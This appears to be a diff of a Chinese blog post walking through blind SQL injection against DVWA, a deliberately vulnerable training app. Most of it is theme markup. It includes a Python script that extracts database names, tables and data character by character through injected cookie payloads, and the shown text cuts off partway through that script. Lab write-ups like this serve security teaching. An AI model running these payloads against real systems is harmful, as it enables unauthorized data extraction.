@@ -1,17 +1,21 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.9.0">
-  
-  <title>DVWA-SQL_Injection_Blind（sql盲注） - 花花的blog</title>
-  <meta charset="UTF-8">
-  <meta name="description" content="我告诉你我喜欢你，并不是一定要和你在一起，只是希望今后的你，在遭遇人生低谷的时候，不要灰心，至少曾经有人被你的魅力所吸引，曾经是，以后也会是。">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  
-  
 
-  <link rel="shortcut icon" href="/favicon.ico" type="image/png">
-  <meta name="description" content="DVWA的sql盲注。">
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="huahua">
+
+
+
+<meta name="description" content="DVWA的sql盲注。">
 <meta name="keywords" content="sql注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DVWA-SQL_Injection_Blind（sql盲注）">
@@ -37,232 +41,295 @@
 <meta name="twitter:title" content="DVWA-SQL_Injection_Blind（sql盲注）">
 <meta name="twitter:description" content="DVWA的sql盲注。">
 <meta name="twitter:image" content="https://s2.ax1x.com/2019/11/12/M8pniV.png">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
-   
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
-  
-  
-  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1578720655758">
-</head>
 
-<body class="mdui-drawer-body-left">
-  
-  <div id="nexmoe-background">
-    <div class="nexmoe-bg" style="background-image: url(https://i.loli.net/2019/01/13/5c3aec85a4343.jpg)"></div>
-    <div class="mdui-appbar mdui-shadow-0">
-      <div class="mdui-toolbar">
-        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
-        <div class="mdui-toolbar-spacer"></div>
-        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
-        <a href="/" title="huahua" class="mdui-btn mdui-btn-icon"><img src="/images/avatar.png"></a>
-       </div>
-    </div>
-  </div>
-  <div id="nexmoe-header">
-      <div class="nexmoe-drawer mdui-drawer" id="drawer">
-    <div class="nexmoe-avatar mdui-ripple">
-        <a href="/" title="huahua">
-            <img src="/images/avatar.png" alt="huahua">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="花花的blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/avatar.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>DVWA-SQL_Injection_Blind（sql盲注） | 花花的blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
         </a>
-    </div>
-    <div class="nexmoe-count">
-        <div><span>Articles</span>31</div>
-        <div><span>Tags</span>13</div>
-        <div><span>Categories</span>12</div>
-    </div>
-    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        <hgroup>
+          <h1 class="header-author"><a href="/">huahua</a></h1>
+        </hgroup>
+
         
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
-            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
-            <div class="mdui-list-item-content">
-                回到首页
+        <p class="header-subtitle">厚积薄发</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
             </div>
-        </a>
         
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
-            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
-            <div class="mdui-list-item-content">
-                关于博客
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS攻击/">XSS攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss攻击/">xss攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/作业/">作业</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/动漫/">动漫</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码学/">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/新闻/">新闻</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/暴力破解/">暴力破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/测试/">测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻击/">渗透攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/记录/">记录</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
             </div>
-        </a>
-        
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
-            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
-            <div class="mdui-list-item-content">
-                我的朋友
-            </div>
-        </a>
-        
-    </ul>
-    <aside id="nexmoe-sidebar">
-  
-  <div class="nexmoe-widget-wrap">
-    <h3 class="nexmoe-widget-title">Social</h3>
-    <div class="nexmoe-widget nexmoe-social">
-        <a class="mdui-ripple" href="https://space.bilibili.com/20238211" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
-            <i class="nexmoefont icon-bilibili"></i>
-        </a><a class="mdui-ripple" href="https://github.com/nexmoe/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
-            <i class="nexmoefont icon-github"></i>
-        </a>
-    </div>
+        </div>
+    </header>                
 </div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">huahua</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">huahua</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">厚积薄发</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-DVWA-SQL-Injection-Blind" class="article article-type-post" itemscope itemprop="blogPost">
   
-  
-  <div class="nexmoe-widget-wrap">
-    <h3 class="nexmoe-widget-title">Categories</h3>
-    <div class="nexmoe-widget">
+    <div class="article-meta">
+      <a href="/2019/11/12/DVWA-SQL-Injection-Blind/" class="article-date">
+      <time datetime="2019-11-12T12:26:23.000Z" itemprop="datePublished">2019-11-12</time>
+</a>
 
-      <ul class="category-list">
-
-        
-
-
-        
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/XSS攻击/">XSS攻击</a>
-          <span class="category-list-count">1</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/java/">java</a>
-          <span class="category-list-count">6</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/sql注入/">sql注入</a>
-          <span class="category-list-count">4</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/xss攻击/">xss攻击</a>
-          <span class="category-list-count">2</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/作业/">作业</a>
-          <span class="category-list-count">1</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/密码学/">密码学</a>
-          <span class="category-list-count">3</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/新闻点评/">新闻点评</a>
-          <span class="category-list-count">1</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/暴力破解/">暴力破解</a>
-          <span class="category-list-count">1</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/渗透攻击/">渗透攻击</a>
-          <span class="category-list-count">1</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/生活日常/">生活日常</a>
-          <span class="category-list-count">1</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/算法/">算法</a>
-          <span class="category-list-count">8</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/记录/">记录</a>
-          <span class="category-list-count">1</span>
-        </li>
-
-        
-      </ul>
 
     </div>
-  </div>
-
-
   
-  
-  <div class="nexmoe-widget-wrap">
-    <h3 class="nexmoe-widget-title">Tagcloud</h3>
-    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
-      <a href="/tags/XSS攻击/" style="font-size: 10px;">XSS攻击</a> <a href="/tags/java/" style="font-size: 18px;">java</a> <a href="/tags/sql注入/" style="font-size: 16px;">sql注入</a> <a href="/tags/xss攻击/" style="font-size: 12px;">xss攻击</a> <a href="/tags/作业/" style="font-size: 10px;">作业</a> <a href="/tags/动漫/" style="font-size: 10px;">动漫</a> <a href="/tags/密码学/" style="font-size: 14px;">密码学</a> <a href="/tags/新闻/" style="font-size: 10px;">新闻</a> <a href="/tags/暴力破解/" style="font-size: 10px;">暴力破解</a> <a href="/tags/测试/" style="font-size: 10px;">测试</a> <a href="/tags/渗透攻击/" style="font-size: 10px;">渗透攻击</a> <a href="/tags/算法/" style="font-size: 20px;">算法</a> <a href="/tags/记录/" style="font-size: 10px;">记录</a>
-    </div>
+  <div class="article-inner">
     
-  </div>
-
-  
-  
-  <div class="nexmoe-widget-wrap">
-    <h3 class="nexmoe-widget-title">Archive</h3>
-    <div class="nexmoe-widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
-    </div>
-  </div>
-
-
-  
-</aside>
-    <div class="nexmoe-copyright">
-        &copy; 2020 huahua
-        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
-    </div>
-</div><!-- .nexmoe-drawer -->
-  </div>
-  <div id="nexmoe-content">
-    <div class="nexmoe-primary">
-        <div class="nexmoe-post">
-    <div class="nexmoe-post-cover"> 
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
         
-            <img src="https://i.loli.net/2019/01/13/5c3aec85a4343.jpg">
+  
+    <h1 class="article-title" itemprop="name">
+      DVWA-SQL_Injection_Blind（sql盲注）
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
         
-        <h1>DVWA-SQL_Injection_Blind（sql盲注）</h1>
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/sql注入/">sql注入</a>
     </div>
-  <div class="nexmoe-post-meta">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2019年11月12日</a>
-    <a><i class="nexmoefont icon-areachart"></i>6,364 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 38 分钟</a>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
     
-      <a class="nexmoefont icon-appstore-fill -link" href="/categories/sql注入/">sql注入</a>
-    
-    
-      <a class="nexmoefont icon-tag-fill -link" href="/tags/sql注入/">sql注入</a>
-    
-  </div>
-  <article>
-    <p>DVWA的sql盲注。</p>
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>DVWA的sql盲注。</p>
 <a id="more"></a>
 
 <p>SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
@@ -345,66 +412,245 @@
 <h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Injection</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.s = requests.session()</span><br><span class="line">        self.zifuji = [<span class="number">44</span>,<span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">119</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">122</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">77</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">85</span>, <span class="number">86</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">95</span>, <span class="number">45</span>, <span class="number">64</span>, <span class="number">33</span>, <span class="number">38</span>, <span class="number">36</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_headers</span><span class="params">(self,payload)</span>:</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: <span class="string">"id=&#123;0&#125;; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c"</span>.format(payload)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> headers</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(self,yourstr,num1,num2)</span>:</span></span><br><span class="line">        print(<span class="string">"[+] Please wait ... &#123;0&#125; [&#123;1&#125;]/[&#123;2&#125;]"</span>.format(yourstr,str(num1),str(num2)),end=<span class="string">'\r'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,text)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"User ID exists in the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"User ID is MISSING from the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.get_itsnum()</span><br><span class="line">        self.get_database_length()</span><br><span class="line">        self.get_database()</span><br><span class="line">        self.get_table_num()</span><br><span class="line">        self.table_length = []</span><br><span class="line">        self.table_name = []</span><br><span class="line">        self.get_table_length()</span><br><span class="line">        self.get_table_name()</span><br><span class="line">        table_name = input(<span class="string">'[-] table_name: '</span>)</span><br><span class="line">        self.get_column_num(table_name)</span><br><span class="line">        self.column_length = []</span><br><span class="line">        self.column_name = []</span><br><span class="line">        self.get_column_length(table_name)</span><br><span class="line">        self.get_column_name(table_name)</span><br><span class="line">        column_names = input(<span class="string">'[-] column_name: '</span>).split(<span class="string">','</span>)</span><br><span class="line">        self.word_num = <span class="number">0</span></span><br><span class="line">        self.get_word_num(table_name,column_names[<span class="number">0</span>])</span><br><span class="line">        self.word_name = []</span><br><span class="line">        self.word_length = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(column_names)):</span><br><span class="line">            print(column_names[i])</span><br><span class="line">            self.get_word_length(table_name,column_names[i])</span><br><span class="line">            self.get_word_name(table_name,column_names[i],i)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_itsnum</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.itsnum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            self.process(<span class="string">'get_itsnum'</span>,i,<span class="number">50</span>)</span><br><span class="line">            payload = <span class="string">"1' order by &#123;0&#125;#"</span>.format(str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.check(html):</span><br><span class="line">                self.itsnum = i - <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.itsnum &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.itsnum)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the itsnum"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_database_length</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.database_length = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_database_length'</span>,i,<span class="number">30</span>)</span><br><span class="line">            payload = <span class="string">"1' and length(database())=&#123;0&#125;#"</span>.format(str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.database_length = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.database_length &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.database_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the database_length"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.database = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.database_length+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(str(i) + <span class="string">' get_database'</span>,j,self.database_length+<span class="number">1</span>)</span><br><span class="line">                payload = <span class="string">"1' and ascii(substring(database(),&#123;0&#125;,1))=&#123;1&#125;#"</span>.format(str(i),str(j))</span><br><span class="line">                html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    self.database += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(self.database) != i:</span><br><span class="line">                self.database += <span class="string">'666'</span></span><br><span class="line">        <span 